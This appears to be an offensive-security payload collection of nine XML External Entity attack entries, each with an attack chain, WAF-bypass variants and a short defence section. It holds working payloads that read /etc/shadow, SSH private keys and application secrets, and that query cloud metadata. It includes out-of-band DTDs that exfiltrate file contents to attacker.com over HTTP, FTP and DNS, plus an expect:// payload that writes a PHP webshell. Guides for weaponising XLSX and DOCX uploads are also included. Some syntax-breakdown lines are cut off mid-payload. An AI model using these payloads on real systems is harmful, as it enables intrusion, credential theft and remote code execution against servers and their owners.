# XXE Entity Injection

_9 web payloads_

### XXE Basic Attack  `xxe-basic`
_Basic techniques for XML External Entity injection attacks_
Subcategory: **Basic Attack** · tags: `xxe` `xml` `external` `entity`

**Prerequisites:**
- An XML parsing feature exists
- External entities are not disabled

**Attack Chain:**

**1. Probe for XXE**
> Basic XXE test
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
**Syntax breakdown:**
- `DOCTYPE` — document type declaration _value_
- `ENTITY` — defines an entity _value_
- `SYSTEM` — references an external resource _value_
- `&xxe;` — references the entity _value_

**2. Read a file**
> Read a Windows file
_platform: windows_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```
**Syntax breakdown:**
- `file://` — file protocol _method_
- `<!DOCTYPE>` — document type declaration _tag_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_

**3. Read PHP source code**
> Use a PHP Filter to read the source code
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```
**Syntax breakdown:**
- `php://filter` — PHP pseudo-protocol _value_
- `convert.base64-encode` — Base64 encoding _value_

**4. SSRF attack**
> Use XXE for SSRF
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```
**Syntax breakdown:**
- `169.254.169.254` — cloud metadata IP _domain_
- `<!DOCTYPE>` — document type declaration _tag_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_

**WAF/EDR Bypass Variants:**

**Parameter entity**
> Bypass using a parameter entity
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```
**Syntax breakdown:**
- `%` — parameter entity reference symbol _operator_
- `%xxe;` — references the parameter entity _variable_

**Encoding bypass**
> Bypass using encoding
```
<?xml version="1.0" encoding="UTF-16"?>
Use a different encoding to bypass the WAF
```
**Syntax breakdown:**
- `<?xml` — command/keyword _command_

**Overview:** XXE (XML External Entity) injection exploits the XML parser's feature of processing external entity references. By defining a malicious entity reference, an attacker can read server files, initiate SSRF requests, or even execute remote code in specific environments.

**Vulnerability Principle:** XXE vulnerabilities stem from XML parsers enabling external entity processing by default. The attacker declares a SYSTEM or PUBLIC entity in the XML input pointing to a local file (file://) or a network resource (http://), and the parser automatically fetches and substitutes the entity content, leading to file reading, SSRF, and other harms.

**Exploitation Method:** Complete exploitation flow:
1. Find an XML input point
2. Inject an external entity declaration
3. Read a sensitive file
4. Or initiate an SSRF attack

**Defensive Measures:** Defenses:
1. Disable external entity processing
2. Disable DTD processing
3. Use a secure XML parser configuration
4. Input validation

---

### Blind XXE Attack  `xxe-blind`
_XXE attack techniques with no response echo_
Subcategory: **Blind XXE** · tags: `xxe` `blind` `oob` `xml`

**Prerequisites:**
- XML parsing exists
- No direct response echo

**Attack Chain:**

**1. External entity probing**
> Probe using an external entity
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>
```
**Syntax breakdown:**
- `DOCTYPE` — document type declaration _value_
- `ENTITY` — defines an entity _value_
- `SYSTEM` — external system resource _value_
- `&xxe;` — references the entity _value_

**2. Parameter entity**
> Use a parameter entity
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>
```
**Syntax breakdown:**
- `%` — parameter entity identifier _operator_
- `%xxe;` — references the parameter entity _variable_

**3. OOB data exfiltration**
> OOB exfiltration of file content
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>

# xxe.dtd content
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```
**Syntax breakdown:**
- `file://` — file protocol _method_
- `<!DOCTYPE>` — document type declaration _tag_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_
- `/etc/passwd` — sensitive file path _path_
- `&#xx;` — HTML entity encoding _encoding_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
Encode the XML document in UTF-16
to bypass WAF detection
```
**Syntax breakdown:**
- `Encode the XML document in UTF-16
to bypass WAF detection` — attack payload _value_

**Overview:** Blind XXE refers to the scenario where XML external entity injection succeeds but the entity content is not directly displayed in the response, requiring out-of-band (OOB) data exfiltration techniques to send the read file content to an attacker-controlled server via HTTP/DNS and similar means.

**Vulnerability Principle:** Blind XXE uses parameter entities (%entity) and an external DTD to achieve data exfiltration: nested entity references are defined in the external DTD, concatenating the file content into an HTTP request URL and sending it to the attacker's server. Some XML parsers restrict entity nesting, requiring a different exfiltration strategy.

**Exploitation Method:** Complete exploitation flow:
1. Confirm XXE exists
2. Use a parameter entity
3. Construct OOB exfiltration
4. Obtain sensitive data

**Defensive Measures:** Defending against Blind XXE: disable XML external entities and DTD processing (most effective), use JSON instead of XML format, configure a network-layer outbound traffic allowlist to block OOB data exfiltration, deploy a WAF to detect DTD declarations and entity references, and monitor abnormal DNS/HTTP outbound requests.

---

### XXE OOB Exfiltration Attack  `xxe-oob`
_Use OOB techniques to exfiltrate XXE data_
Subcategory: **OOB Exfiltration** · tags: `xxe` `oob` `exfiltration` `xml`

**Prerequisites:**
- An XXE vulnerability exists
- External requests can be initiated

**Attack Chain:**

**1. HTTP exfiltration**
> HTTP data exfiltration
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```
**Syntax breakdown:**
- `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` — a parameter entity references a remote malicious DTD file _command_
- `%xxe;` — expand the parameter entity in the DTD, loading the remote DTD _operator_
- `<!ENTITY % file SYSTEM "file:///etc/passwd">` — read a local file on the target server in the DTD _value_
- `http://attacker.com/log?data=%file;` — exfiltrate the file content via an HTTP request parameter _value_

**2. FTP exfiltration**
> FTP data exfiltration
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```
**Syntax breakdown:**
- `ftp://attacker.com/%file;` — use the FTP protocol to exfiltrate data, supporting multi-line content _command_
- `%eval;` — expand the eval parameter entity to dynamically construct the exfiltration entity _operator_
- `%exfil;` — trigger the exfiltration request, sending the data to the attacker's FTP server _operator_

**3. DNS exfiltration**
> DNS exfiltration
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">
]>
<foo>&xxe;</foo>

# Or use a subdomain
<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">
```
**Syntax breakdown:**
- `http://filecontent.attacker.com/` — exfiltrate the file content as a subdomain via DNS resolution _value_
- `&xxe;` — reference the general entity in the XML content to trigger the request _operator_

**WAF/EDR Bypass Variants:**

**Use CDATA**
> CDATA wrapping
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```
**Syntax breakdown:**
- `<![CDATA[` — XML CDATA section start marker, the content is not processed by the XML parser _operator_
- `&xxe;` — the entity reference is parsed and expanded before the CDATA _variable_
- `]]>` — CDATA section end marker _operator_

**Overview:** XXE OOB (Out-of-Band) data exfiltration is the core exploitation technique for Blind XXE, transferring internal server data to the attacker via external channels such as HTTP/FTP/DNS. It is the key step for taking an XXE vulnerability from detection to actual data extraction.

**Vulnerability Principle:** XXE OOB is achieved through multi-layer parameter entity nesting: 1) the first entity reads the target file 2) the second entity (external DTD) concatenates the file content into an HTTP URL 3) the parser requests that URL and sends the data to the attacker. The FTP protocol can exfiltrate multi-line content, and DNS can serve as a covert channel in a strict network environment.

**Exploitation Method:** Complete exploitation flow:
1. Host a malicious DTD file
2. Construct an XXE payload
3. Trigger the exfiltration request
4. Receive and parse the data

**Defensive Measures:** Defending against XXE OOB: completely disable external entity processing and DTD loading, configure a strict outbound network policy (only allow necessary allowlisted outbound traffic), monitor abnormal DNS queries and HTTP outbound requests, and use RASP to detect file access and network request behavior during XML parsing.

---

### XXE+SSRF Combined Attack  `xxe-ssrf`
_Use XXE to achieve an SSRF attack_
Subcategory: **XXE+SSRF** · tags: `xxe` `ssrf` `combination` `xml`

**Prerequisites:**
- An XXE vulnerability exists
- The internal network is accessible

**Attack Chain:**

**1. Scan internal ports**
> Scan internal ports
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

# Bulk scan
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
```
**Syntax breakdown:**
- `<!ENTITY xxe SYSTEM` — define an external general entity, supporting multiple protocols _command_
- `"http://192.168.1.1:22"` — target internal IP and port, determine the port status via response differences _value_
- `&xxe;` — reference the entity in the XML content to trigger the HTTP request _operator_

**2. Access internal services**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
]>
<foo>&xxe;</foo>

# Access Redis
# Access internal API
```
**Syntax breakdown:**
- `127.0.0.1` — local loopback _domain_
- `<!DOCTYPE>` — document type declaration _tag_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
Use different encoding formats to bypass IP filtering
```
**Syntax breakdown:**
- `IP encoding` — use decimal (2130706433), hexadecimal (0x7f000001), octal (0177.0.0.1) to bypass _command_
- `URL encoding` — apply single or double URL encoding to the URL to bypass filtering _parameter_

**Overview:** XXE SSRF uses an XML external entity to initiate a server-side request, which can probe and access internal services, cloud metadata APIs, local ports, and so on, extending the impact of the XXE vulnerability from the server hosting the XML parser to the entire internal network environment.

**Vulnerability Principle:** XXE SSRF references an internal URL via a SYSTEM entity: <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/"> to obtain cloud metadata, http://internal-service:8080/admin to access an internal management interface, http://127.0.0.1:port/ for port scanning, and so on.

**Exploitation Method:** Complete exploitation flow:
1. Discover the XXE vulnerability
2. Construct an SSRF payload
3. Access internal services
4. Obtain sensitive information

**Defensive Measures:** Defending against XXE SSRF: disable external entity processing, configure network segmentation to restrict the network access scope of the XML parsing server, block requests to the metadata service (169.254.169.254), enable IMDSv2 (AWS) to require token authentication, and monitor abnormal internal HTTP requests.

---

### XXE to RCE  `xxe-rce`
_Use XXE to achieve remote code execution_
Subcategory: **XXE to RCE** · tags: `xxe` `rce` `php` `expect`

**Prerequisites:**
- An XXE vulnerability exists
- The PHP expect extension is loaded

**Attack Chain:**

**1. Expect extension RCE**
> Use the expect protocol to execute a command
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>

# Execute any command
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
```
**Syntax breakdown:**
- `expect://` — PHP expect protocol _value_
- `whoami` — the command to execute _command_

**2. Write a WebShell**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://echo '<?php eval($_POST[cmd]);?>' > /var/www/html/shell.php">
]>
<foo>&xxe;</foo>
```
**Syntax breakdown:**
- `<!DOCTYPE>` — document type declaration _tag_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
Use Base64 or other encoding to bypass command filtering
```
**Syntax breakdown:**
- `Use Base64 or other encoding to bypass command filtering` — attack payload _value_

**Overview:** XXE remote code execution can be achieved in specific environments: PHP's expect:// protocol directly executes commands, writing a WebShell file via XXE, using XXE SSRF to attack internal services (such as Redis) for indirect RCE, and combining Java deserialization with XXE.

**Vulnerability Principle:** XXE RCE exploitation paths: 1) PHP expect:// wrapper (<!ENTITY rce SYSTEM "expect://whoami">) 2) combined with file upload to write a WebShell 3) XXE SSRF → gopher:// to attack an internal Redis/MySQL for RCE 4) in a Java environment, XXE triggers a deserialization vulnerability.

**Exploitation Method:** Complete exploitation flow:
1. Confirm the expect extension is available
2. Construct an expect protocol payload
3. Execute a system command
4. Obtain a shell

**Defensive Measures:** Defending against XXE RCE: disable external entities and all PHP stream wrappers, remove unnecessary PHP extensions (such as expect), enforce strict file system permissions to prevent writing to the web directory, use network isolation to restrict the network access of the XML parsing server, and regularly update the XML parsing library version.

---

### XXE File Read  `xxe-file-read`
_Use XXE to read server files_
Subcategory: **File Read** · tags: `xxe` `file` `read` `lfi`

**Prerequisites:**
- An XXE vulnerability exists
- File read permissions are available

**Attack Chain:**

**1. Read Linux files**
> Read Linux system files
_platform: linux_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# Other sensitive files
file:///etc/shadow
file:///etc/hosts
file:///root/.ssh/id_rsa
file:///proc/self/environ
```
**Syntax breakdown:**
- `file://` — local file protocol _value_
- `/etc/passwd` — user information file _path_

**2. Read Windows files**
> Read Windows system files
_platform: windows_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>

# Other sensitive files
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
```
**Syntax breakdown:**
- `<?xml version="1.0"?>` — XML declaration/entity definition _tag_
- `<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">` — XML declaration/entity definition _tag_
- `
]>
<foo>&xxe;</foo>

# Other sensitive files
file:///c:/windows/syste` — XML content _value_

**3. Read web configuration**
> Read the web application configuration
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<foo>&xxe;</foo>

# Common configuration files
file:///var/www/html/wp-config.php
file:///app/.env
file:///app/config/database.yml
```
**Syntax breakdown:**
- `<?xml version="1.0"?>` — XML declaration/entity definition _tag_
- `<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">` — XML declaration/entity definition _tag_
- `
]>
<foo>&xxe;</foo>

# Common configuration files
file:///var/www/html/wp-` — XML content _value_

**4. Read source code**
> Use a PHP Filter to read the source code
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<foo>&xxe;</foo>
```
**Syntax breakdown:**
- `<?xml version="1.0"?>` — XML declaration/entity definition _tag_
- `<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc` — XML declaration/entity definition _tag_
- `
]>
<foo>&xxe;</foo>` — XML content _value_

**WAF/EDR Bypass Variants:**

**Use a parameter entity**
> Parameter entity bypass
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY bar "%xxe;">
]>
<foo>&bar;</foo>
```
**Syntax breakdown:**
- `<?xml version="1.0"?>` — XML declaration/entity definition _tag_
- `<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">` — XML declaration/entity definition _tag_
- `<!ENTITY bar "%xxe;">` — XML declaration/entity definition _tag_
- `
]>
<foo>&bar;</foo>` — XML content _value_

**Overview:** XXE file reading is the most basic exploitation of an XXE vulnerability, defining an external entity via the file:// protocol to read local files on the server. The direct-echo method allows the file content to be seen in the response, and it is the first step in XXE vulnerability validation and information gathering.

**Vulnerability Principle:** XXE file reading uses the file:// protocol: <!ENTITY file SYSTEM "file:///etc/passwd">. Key readable files include system configuration (/etc/passwd, /etc/hosts), application source code, database configuration (containing passwords), SSH keys, and so on. Binary files need to be read using PHP's php://filter/base64 encoding.

**Exploitation Method:** Complete exploitation flow:
1. Discover the XXE vulnerability
2. Construct a file read payload
3. Read sensitive files
4. Obtain credential information

**Defensive Measures:** Defending against XXE file reading: disable external entities in the XML parser configuration (e.g. Java's setFeature DISALLOW_DOCTYPE), use a secure XML library (such as defusedxml for Python), minimize the system privileges of the process running the XML parser, and set sensitive file permissions to owner-read-only.

---

### XXE External DTD Exploitation  `xxe-dtd`
_Use an external DTD file for an XXE attack_
Subcategory: **External DTD** · tags: `xxe` `dtd` `external` `xml`

**Prerequisites:**
- An XXE vulnerability exists
- An external DTD is accessible

**Attack Chain:**

**1. Host a malicious DTD**
> Create a malicious DTD file
```
# Create evil.dtd on the attacker's server
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```
**Syntax breakdown:**
- `<!ENTITY % file SYSTEM "file:///etc/passwd">` — a parameter entity reads the target system file _command_
- `&#x25;` — the HTML entity encoding of %, used to reference another parameter entity within an entity definition _operator_
- `http://attacker.com/?d=%file;` — exfiltrate the file content via an HTTP request parameter _value_

**2. Reference the external DTD**
> Reference the external DTD file
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```
**Syntax breakdown:**
- `<!DOCTYPE foo [` — start of the DTD declaration block _command_
- `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` — define a parameter entity pointing to the remote malicious DTD file _command_
- `%xxe;` — expand the parameter entity, loading and executing the definitions in the remote DTD _operator_

**3. Multi-step exfiltration**
> Handle special characters
```
# evil.dtd - multi-step exfiltration
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```
**Syntax breakdown:**
- `<![CDATA[` — CDATA start marker, handles XML special characters in the file _operator_
- `%start;%file;%end;` — concatenate the CDATA markers and file content to avoid XML parsing errors _variable_
- `%all;` — expand the entity containing the fully CDATA-wrapped data _operator_

**4. Error message leakage**
> Error message exfiltration
```
# Use the error message to leak data
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

# The error message will contain the file content
```
**Syntax breakdown:**
- `file://` — file protocol _method_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_
- `/etc/passwd` — sensitive file path _path_
- `&#xx;` — HTML entity encoding _encoding_

**WAF/EDR Bypass Variants:**

**Use HTTPS**
> HTTPS bypass
```
Host the DTD file over HTTPS to bypass HTTP filtering
```
**Syntax breakdown:**
- `Host the DTD file over HTTPS to bypass HTTP filtering` — command/keyword _command_

**Overview:** The XXE DTD attack exploits the entity declaration feature in a Document Type Definition (DTD), defining and exploiting malicious entities via an internal DTD or by loading an external DTD file. The external DTD method can bypass some parsers' restrictions on parameter entity nesting in an internal DTD.

**Vulnerability Principle:** XXE DTD exploitation methods: 1) an internal DTD directly declares a SYSTEM entity to read a file 2) an external DTD loads a malicious DTD file on the attacker's server 3) exploit a local DTD file to redefine entities (applicable to environments that prohibit external DTD loading) 4) parameter entity nesting to achieve complex data exfiltration operations.

**Exploitation Method:** Complete exploitation flow:
1. Create a malicious DTD file
2. Host it on the attacker's server
3. Construct an XXE that references the DTD
4. Trigger exfiltration to obtain data

**Defensive Measures:** Defending against XXE DTD: completely disable DTD processing (disallow-doctype-decl=true), prohibit loading external DTD files, only allow a specific local DTD if a DTD must be used, have the WAF detect and block XML requests containing DOCTYPE declarations, and use a lightweight XML parsing mode that does not support DTDs.

---

### XLSX File XXE  `xxe-xlsx`
_Use an XLSX file for an XXE attack_
Subcategory: **XLSX File XXE** · tags: `xxe` `xlsx` `excel` `office`

**Prerequisites:**
- The application parses XLSX files
- An XXE vulnerability exists

**Attack Chain:**

**1. Unzip the XLSX file**
> Unzip the XLSX file
```
# An XLSX is essentially a ZIP file
unzip spreadsheet.xlsx

# Main file structure
xl/workbook.xml
xl/worksheets/sheet1.xml
xl/sharedStrings.xml
[Content_Types].xml
```
**Syntax breakdown:**
- `unzip spreadsheet.xlsx` — an XLSX is a ZIP archive, unzip it directly to obtain the internal XML files _command_
- `xl/workbook.xml` — the main workbook configuration file, contains Sheet information _value_
- `xl/worksheets/sheet1.xml` — the worksheet data file, contains cell content _value_
- `[Content_Types].xml` — the content type definition file, can also serve as an XXE injection point _value_

**2. Inject the XXE payload**
```
# Modify xl/workbook.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="...">
&xxe;
</workbook>
```
**Syntax breakdown:**
- `file://` — file protocol _method_
- `<!DOCTYPE>` — document type declaration _tag_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_
- `/etc/passwd` — sensitive file path _path_

**WAF/EDR Bypass Variants:**

**Modify Content_Types**
> Modify Content_Types
```
Modify [Content_Types].xml to inject XXE
```
**Syntax breakdown:**
- `[Content_Types].xml` — the content type definition file in an XLSX, often overlooked _value_
- `XXE injection` — inject XXE in this file to bypass a WAF that only checks workbook.xml _command_

**Overview:** An XLSX file is essentially multiple XML files inside a ZIP archive. Uploading a malicious XLSX file can trigger an XXE vulnerability in the server-side XML parser. Office document processing, data import, and reporting systems are common attack entry points.

**Vulnerability Principle:** XLSX XXE exploitation steps: unzip the XLSX file → inject an XXE entity declaration into an XML file such as xl/workbook.xml or [Content_Types].xml → re-zip it into an XLSX → upload it to the target system. When the server uses an insecure XML parser to process the XLSX, XXE is triggered to read files or perform SSRF.

**Exploitation Method:** Complete exploitation flow:
1. Unzip the XLSX file
2. Inject the XXE payload
3. Repackage it
4. Upload to trigger the vulnerability

**Defensive Measures:** Defending against XLSX XXE: use a securely configured XML parsing library to process Office documents, validate the XLSX file structure and strip DTD declarations before parsing, use a dedicated Office document processing library (such as Apache POI configured to disable external entities), and perform sandboxed parsing of uploaded files.

---

### DOCX File XXE  `xxe-docx`
_Use a DOCX file for an XXE attack_
Subcategory: **DOCX File XXE** · tags: `xxe` `docx` `word` `office`

**Prerequisites:**
- The application parses DOCX files
- An XXE vulnerability exists

**Attack Chain:**

**1. Unzip the DOCX file**
> Unzip the DOCX file
```
# A DOCX is essentially a ZIP file
unzip document.docx

# Main file structure
word/document.xml
word/_rels/document.xml.rels
[Content_Types].xml
```
**Syntax breakdown:**
- `unzip document.docx` — a DOCX is a ZIP archive, unzip it to obtain the internal XML _command_
- `word/document.xml` — the main document content file, the core injection point _value_
- `word/_rels/document.xml.rels` — the document relationships file, can also serve as an injection point _value_
- `[Content_Types].xml` — the content type definition, an alternative injection point _value_

**2. Inject the XXE payload**
```
# Modify word/document.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="...">
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:document>
```
**Syntax breakdown:**
- `file://` — file protocol _method_
- `<!DOCTYPE>` — document type declaration _tag_
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity reference _keyword_
- `/etc/passwd` — sensitive file path _path_

**WAF/EDR Bypass Variants:**

**Modify the relationships file**
> Modify the relationships file
```
Modify _rels/.rels or document.xml.rels to inject XXE
```
**Syntax breakdown:**
- `_rels/.rels` — the DOCX root relationships file, defines the associations between document parts _value_
- `document.xml.rels` — the document relationships file, an injection point often overlooked by WAFs _value_
- `XXE injection` — inject an XXE entity in the relationships file to bypass content detection _command_

**Overview:** A DOCX file, like an XLSX, is an XML-based Office Open XML format. By modifying the XML files within it to inject an XXE entity, a server-side XXE vulnerability can be triggered in a document processing system (online preview/format conversion/content extraction).

**Vulnerability Principle:** DOCX XXE injection points include: word/document.xml (main document content), [Content_Types].xml (content type definition), word/_rels/.rels (relationship definitions), and other XML files. Online document preview services, file format conversion APIs, resume parsing systems, and so on are all high-risk attack surfaces.

**Exploitation Method:** Complete exploitation flow:
1. Unzip the DOCX file
2. Inject the XXE payload
3. Repackage it
4. Upload to trigger the vulnerability

**Defensive Measures:** Defending against DOCX XXE: the same as XLSX defenses, use a securely configured XML parser, disable external entities, preprocess user-uploaded Office documents (strip DTD/entity declarations), process untrusted documents in an isolated environment, and restrict the network and file access permissions of the document processing process.

---
